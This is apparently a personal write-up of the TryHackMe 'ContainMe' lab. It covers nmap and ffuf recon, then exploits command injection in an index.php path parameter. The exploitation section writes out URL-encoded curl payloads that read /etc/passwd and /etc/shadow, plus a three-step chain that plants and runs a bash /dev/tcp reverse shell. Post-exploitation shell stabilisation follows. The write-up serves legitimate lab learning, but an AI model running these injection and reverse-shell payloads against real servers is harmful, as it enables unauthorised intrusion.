---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-03T16:18:13.012+02:00","dg-note-properties":{}}
---

![](/img/user/Attachments/redteaming2.png)
## Description


## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/fullnmap.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

```
% sudo nmap -oN nmap-specific.txt 10.113.154.153 -sV -sC -vv -p22,80,2222,8022  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 15:14 CEST  
NSE: Loaded 157 scripts for scanning.  
NSE: Script Pre-scanning.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 15:14  
Completed NSE at 15:14, 0.00s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 15:14  
Completed NSE at 15:14, 0.00s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 15:14  
Completed NSE at 15:14, 0.00s elapsed  
Initiating Ping Scan at 15:14  
Scanning 10.113.154.153 [4 ports]  
Completed Ping Scan at 15:14, 0.11s elapsed (1 total hosts)  
Initiating Parallel DNS resolution of 1 host. at 15:14  
Completed Parallel DNS resolution of 1 host. at 15:14, 0.17s elapsed  
Initiating SYN Stealth Scan at 15:14  
Scanning 10.113.154.153 [4 ports]  
Discovered open port 80/tcp on 10.113.154.153  
Discovered open port 2222/tcp on 10.113.154.153  
Discovered open port 8022/tcp on 10.113.154.153  
Discovered open port 22/tcp on 10.113.154.153  
Completed SYN Stealth Scan at 15:14, 0.16s elapsed (4 total ports)  
Initiating Service scan at 15:14  
Scanning 4 services on 10.113.154.153  
Completed Service scan at 15:17, 158.89s elapsed (4 services on 1 host)  
NSE: Script scanning 10.113.154.153.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 15:17  
Completed NSE at 15:17, 30.18s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 15:17  
Completed NSE at 15:17, 1.11s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 15:17  
Completed NSE at 15:17, 0.00s elapsed  
Nmap scan report for 10.113.154.153  
Host is up, received echo-reply ttl 62 (0.11s latency).  
Scanned at 2026-04-02 15:14:21 CEST for 191s  
  
PORT     STATE SERVICE       REASON         VERSION  
22/tcp   open  ssh           syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZuuEok1Fj1PzF8NErC0Norql6X1jpgY1lgab4Ic+p22Xim2fsz9G8oxBWQvLHc57LP8oOJkxb4SkJA1bCSvpDX  
XRXcFZJYyTtDkJuJiLzQYfUSFNlb7uJ3UbtXJmhB+0cioQqmoPNR0PMHkzOt/iKmcXz/zxWpa9KDtwg/DKO7tXbXlwCU75gM9TA/CzpV42X8jLdg3GKDN45ZIUD127SV  
B+WUTE3NO12RHOWGKEuVrYzhpt/J2FR1othrB4SC4tjB1mOuKOYQB/w20BVDvLCc/U0kwR3bRP9OyuGCcL6KjHTcqhBASBUSMdZERF4kW3oKneFU/ogel3+xDEV9xP  
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP1L2DsLekoih3uch4TYfg20+y0iLFupq1oBqmPpfaXcwPWVSHBSl6  
VfN99qidxKzOXWH7bC7qNKCLZQOKUUIZo=  
|   256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfYJj6Alf9dI+KYygs+hOfPWUWVebXmTM0zvW4khYy0  
80/tcp   open  http          syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))  
| http-methods:  
|_  Supported Methods: OPTIONS HEAD GET POST  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Apache2 Ubuntu Default Page: It works  
2222/tcp open  EtherNetIP-1? syn-ack ttl 62  
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)  
8022/tcp open  ssh           syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
|   3072 ad:78:34:b2:6a:d7:71:e0:b2:fc:a4:48:b7:42:52:a3 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD4BLvpUcYlEw+PK8T/Gcp15g+T2vceLZX41hPS0QEsA2MMIeYh/vPPceE85IYnStTB8VS0oPcyss0/Kgy5xMJnZP  
yaiNNOaK2uE8hlQhU28LJPp+3t98e8KiaeHitZAcdUBkFgbDxI+RbfpFPUAm3FUdgQEU5saH3wi1Am9xpGmHRswv6fSf0yOdpfK6DuTmGJtoxGwk8LAjoAjIQ+4OjJMO  
SUNFdgmAR2FwYML//7GX+7M2JMf0iJT3bax7eFujhcP3jeWsxJsRy+rdUymtQw0XHp268iZLPWJHxiCrV1EItxgtKtQGFssqb8pjGaFERbZlTl3vfu5ilUSXP6qbvgua  
/Bj7Zq43DwHp1ecwHyBheLhUo5lFu0y8FjTuqoGAgb+4Hvo3hxJMHDM1CojJn/6SIIRWjpw9qJaQYjhX1xFo52HyXeUKXU8VdAxM0kzuYBlmqSVoNNBMegwmToGmyKAD  
YMg5l1eGCHxNPxbmOMdL5aFxwZl4D5L3ru4Gf2zSc=  
|   256 a3:29:51:e2:dc:35:14:c0:99:9d:c5:bc:15:f4:66:6e (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJR0E4siOc1kNI2jMl2drfI25Gsccmd6BfdJEaxtQJYlR2rQe9TSUS  
hg0j8vCpL57qInSKlX4kXQxcX1GNwkQEo=  
|   256 40:9c:b0:c2:3a:54:46:a7:51:63:9c:53:21:18:ce:ca (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGsse9wkOu9Onu5X7hRKO7vpCmLyw8/c7KQjFhRkA5xW  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
NSE: Script Post-scanning.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 15:17  
Completed NSE at 15:17, 0.00s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 15:17  
Completed NSE at 15:17, 0.00s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 15:17  
Completed NSE at 15:17, 0.00s elapsed  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 191.00 seconds  
Raw packets sent: 8 (328B) | Rcvd: 5 (204B)  
marecini@parrot ~/Documents/thm/containme
```
## Enumeration

Visiting the following endpoints either gave me a **forbidden** page or a **not found** page. 
* robots.txt
* README
* CHANGELOG
* .htaccess
* sitemap.xml

Examining the header
`curl -I http://10.113.154.153`

![](/img/user/Attachments/header_examine.png)

Using **DevTools** to explore further there are no API-calls or cookies being used for session management. 

------------

### Fuzzing

`ffuf -u http://10.113.154.153/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak -o ffuf.txt`

![](/img/user/Attachments/ffuf.png)

### Further Inaccessible Endpoints

* /server-status 
* /server-info 
* /.htpasswd 
* /cgi-bin

---------------

Interesting endpoints are found via ffuf.

1. info.php
2. index.php
3. index.html

The source code for **index.php** shows the output of **ls -la** command 

![](/img/user/Attachments/html-comment-indexpage.png)

## Exploitation

Executing the command in the terminal
`curl "http://10.112.132.114/index.php?path=../../../../../etc/passwd"`

![](/img/user/Attachments/wtf.png)

This suggest there is a LFI-vulnerability present.  Running basic BASH commands like `whoami` `ls` `pwd` doesnt produce any results. However injecting a path into the url-parameter does produce something worthwhile. 

Perhaps the intended attack path is LFI or Command Injection. Lets try a payload.

`curl "http://10.112.132.114/index.php?path=../../../../../etc/passwd;id"`

![](/img/user/Attachments/Ci-confirmed.png)

Let's play around and see how far we can push it. 

-------------

### Payload Crafting

**base payload** `curl "http://TARGET_IP/index.php?path=etc;<PAYLOAD>"`

URL-encoding the **end of the payload** allows me to read the **/etc/passwd**

```
curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;cat%20..%2F..%2F..%2F..%2Fetc%2Fpasswd"
```

![](/img/user/Attachments/url-encodedpayload.png)


So we have a user named **mike**. Lets see if we can URL-encode a payload to execute a reverse shell

```
curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.141.140%2F9999%200%3E%261"
```

This did not work... Could be due to netcat not being on the system. I checked and the payload for checking if it is present did not yield anything. 

Checking if I can read /etc/shadow... No luck. 

```
curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;cat%20%2Fetc%2Fshadow1"
```

So far it seems that the only payload which works is the payload to read /etc/passwd. 

---------


Checking which tools are available

Running this command: `which nc netcat ncat python3 python perl bash`

URL-encoding it first to complete the payload
```
curl "http://10.112.132.114/index.php?path=/etc/passwd;which%20nc%20netcat%20ncat%20python3%20python%20perl%20bash"
```

![](/img/user/Attachments/available-tools.png)

So **python perl and bash** are available which explains why spawning a reverse shell with nc was unsuccessful. 

It is possible to write the bash command to a **.sh** script and write it to the server using the **URL-encoding method** to achieve a reverse shell.

------------

#### Step 1: Write it to the Server

**Decoded Payload**
This writes the command from earlier into a .sh script and writes it to the server in the **/tmp** folder

`/tmp;echo 'bash -i >& /dev/tcp/192.168.141.140/4444 0>&1' > /tmp/shell.sh"`

**Encoded Payload**

```
curl "http://10.112.132.114/index.php?path=/tmp;echo%20'bash%20-i%20>%26%20/dev/tcp/192.168.141.140/4444%200>%261'%20>%20/tmp/shell.sh"
```

![](/img/user/Attachments/write-shell-script-to-server.png)

-----------

#### Step 2: Make it Executable

**Decoded**

`curl"http://10.112.132.114/index.php?path=/tmp;chmod +x /tmp/shell.sh"`

**Encoded**

```
curl "http://10.112.132.114/index.php?path=/tmp;chmod%20+x%20/tmp/shell.sh"
```

![](/img/user/Attachments/make-sh-executable.png)

---------

#### Step 3: Execute it

**Decoded**

`curl"http://10.112.132.114/index.php?path=/tmp;bash /tmp/shell.sh"`

**Encoded**

```
curl "http://10.112.132.114/index.php?path=/tmp;bash%20/tmp/shell.sh"
```

#### Reverse Shell 

![](/img/user/Attachments/reverse-shell.png)

## Post-exploitation

As always and is mandatory, the shell must be stabilized. 

`python -c 'import pty;pty.spawn("/bin/bash")'`

Running `export TERM=xterm`  sets the terminal type environment variable.

Without it, many terminal features don't work properly — things like:

- **Clear screen** (`clear` command)
- **Arrow keys** for command history
- **Tab completion**
- **Text editors** like `nano` or `vim` display incorrectly

### Post-exploitation Enumeration

So given the title of the room **ContainMe** perhaps this system is in a container? Checking if there are any indications of a dockerfile or a docker environment. 

```
# Check if a .dockerenv file is present (might still be deleted manually)
ls /.dockerenv

# Checking control groups owns which process
cat /proc/1/cgroup

# Checking if www-data can take advantage of at
echo "/bin/bash -p" | at now

```

* This absence of **.dockerenv** strongly suggest that it is not a docker environment.
* for **cgroups** there is no docker hash visible. only `name=systemd:/init.scope` which suggests a normal system. systemd is running in its normal scope given that PID is set to 1 confirming it is on a linux host.
* the **www-data** has been blocked from using the **at** job scheduler. 

Considering running linpeas at this moment. 

----------------
Looking at running processes the commands which I ran earlier are shown.
```
www-data  6800  sh -c ls -alh      ← command injection
www-data  6804  bash /tmp/she      ← shell script execution
www-data  6836  bash -i            ← reverse shell
www-data  9814  python3 -c im      ← shell stabilisation
```

`ps aux`

![](/img/user/Attachments/psaux.png)

-----------

Revisiting **mike** account and checking the **1cryptupx** file out by running it shows the following.

![](/img/user/Attachments/cryptupx.png)


## Pwnage

First flag: 
Second flag: 

## Attack Pattern Analysis (APA)